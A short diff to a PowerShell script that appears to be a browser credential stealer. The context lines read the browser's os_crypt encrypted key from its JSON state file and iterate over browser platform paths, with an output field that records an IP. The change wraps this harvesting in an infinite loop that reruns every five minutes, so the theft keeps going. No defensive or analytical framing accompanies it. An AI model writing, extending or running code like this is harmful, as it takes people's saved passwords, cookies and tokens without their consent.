@@ -95,7 +95,7 @@ function Get-Key {
     $key = ($jsonContent | ConvertFrom-Json).os_crypt.encrypted_key
     return $key
 }
-
+while ($true) {
 foreach ($platform in $PATHS.Keys) {
     $path = $PATHS[$platform]
     if (!(Test-Path $path)) {
@@ -127,5 +127,6 @@ ip: "$ip"}
         }
     }
 }
-
+Start-Sleep -Seconds 300
+}
 
